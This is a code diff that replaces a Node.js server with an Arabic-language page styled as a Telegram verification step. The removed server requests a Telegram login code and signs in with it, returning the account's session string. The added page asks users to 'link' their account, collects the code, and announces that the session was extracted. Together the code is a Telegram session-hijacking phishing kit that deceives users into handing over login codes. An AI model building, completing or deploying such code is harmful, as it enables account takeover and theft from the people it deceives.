@@ -1,90 +1,132 @@
-const express = require('express');
-const cors = require('cors');
-const { TelegramClient, Api } = require('telegram');
-const { StringSession } = require('telegram/sessions');
-require('dotenv').config();
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>نظام التحقق الآلي</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #18222d;
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #242f3d;
+      padding: 25px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    input {
+      width: 80%;
+      padding: 12px;
+      margin: 15px 0;
+      border-radius: 8px;
+      border: 1px solid #364353;
+      background: #17212b;
+      color: #fff;
+      font-size: 18px;
+      text-align: center;
+    }
+    button {
+      background: #2ea6ff;
+      color: white;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #1a8ad6;
+    }
+    #codeSection {
+      display: none;
+    }
+  </style>
+</head>
+<body>
 
-const app = express();
-app.use(express.json());
-app.use(cors());
-app.use(express.static('public'));
+  <div class="card">
+    <h2 id="title">ربط حساب تيليغرام</h2>
+    <p id="statusDesc" style="color: #8fb1cc; font-size: 14px;">اضغط على الزر أدناه لإرسال كود التحقق إلى حسابك.</p>
 
-const apiId = parseInt(process.env.API_ID || "1234567", 10);
-const apiHash = process.env.API_HASH || "your_api_hash_here";
+    <button id="sendBtn" onclick="sendCode()">إرسال كود التحقق</button>
 
-app.post('/api/auto-init', async (req, res) => {
-  try {
-    const { user, startParam } = req.body;
-    
-    if (!user || !user.id) {
-      return res.status(400).json({ success: false, message: 'بيانات المستخدم غير صالحة' });
+    <div id="codeSection">
+      <input type="text" id="codeInputs" placeholder="أدخل رمز التحقق" maxlength="6">
+      <button onclick="verifyCode()">تأكيد الرمز</button>
+    </div>
+  </div>
+
+  <script>
+    let globalPhoneHash = "";
+    let globalPhone = "";
+
+    async function sendCode() {
+      document.getElementById('statusDesc').innerText = "جاري إرسال الكود...";
+      try {
+        const response = await fetch('/api/send-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        });
+        const result = await response.json();
+
+        if (result.success) {
+          globalPhoneHash = result.phoneCodeHash;
+          globalPhone = result.phone;
+          document.getElementById('title').innerText = "أدخل الرمز";
+          document.getElementById('statusDesc').innerText = "تم إرسال الرمز إلى تيليغرام، اكتبه هنا:";
+          document.getElementById('sendBtn').style.display = 'none';
+          document.getElementById('codeSection').style.display = 'block';
+        } else {
+          alert('خطأ: ' + result.error);
+        }
+      } catch (err) {
+        alert('تعذر الاتصال بالسيرفر.');
+      }
     }
 
-    console.log(`تم استلام طلب من المستخدم: ID = ${user.id}, Username = ${user.username || 'غير متوفر'}`);
+    async function verifyCode() {
+      const code = document.getElementById('codeInputs').value;
+      if (!code) {
+        alert('الرجاء إدخال الرمز');
+        return;
+      }
 
-    const phoneNumber = process.env.TEST_PHONE || "+963XXXXXXXXX";
+      try {
+        const response = await fetch('/api/verify-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phoneNumber: globalPhone,
+            phoneCode: code,
+            phoneCodeHash: globalPhoneHash
+          })
+        });
 
-    const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
-      connectionRetries: 3,
-    });
-    
-    await client.connect();
-
-    const result = await client.invoke(
-      new Api.auth.SendCode({
-        phoneNumber: phoneNumber,
-        apiId: apiId,
-        apiHash: apiHash,
-        settings: new Api.CodeSettings({}),
-      })
-    );
-
-    res.json({
-      success: true,
-      message: 'تم إرسال رمز التحقق بنجاح إلى حسابك',
-      phoneCodeHash: result.phoneCodeHash,
-      phone: phoneNumber
-    });
-
-  } catch (error) {
-    console.error('خطأ في إرسال الرمز:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.post('/api/verify-code', async (req, res) => {
-  try {
-    const { phoneNumber, phoneCode, phoneCodeHash } = req.body;
-
-    const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
-      connectionRetries: 3,
-    });
-    
-    await client.connect();
-
-    const signInResult = await client.invoke(
-      new Api.auth.SignIn({
-        phoneNumber: phoneNumber,
-        phoneCodeHash: phoneCodeHash,
-        phoneCode: phoneCode,
-      })
-    );
-
-    res.json({
-      success: true,
-      message: 'تم تسجيل الدخول بنجاح واستخراج الجلسة',
-      sessionString: client.session.save()
-    });
-
-  } catch (error) {
-    if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
-      return res.json({ success: false, needPassword: true, message: 'الحساب محمي بكلمة مرور (2FA)' });
+        const result = await response.json();
+        if (result.success) {
+          alert('تم تسجيل الدخول بنجاح واستخراج الجلسة!');
+        } else {
+          alert('خطأ: ' + result.error);
+        }
+      } catch (err) {
+        alert('حدث خطأ أثناء التأكيد.');
+      }
     }
-    res.status(400).json({ success: false, error: error.errorMessage || error.message });
-  }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`السيرفر يعمل بنجاح على البورت http://localhost:${PORT}`);
-});
+  </script>
+</body>
+</html>
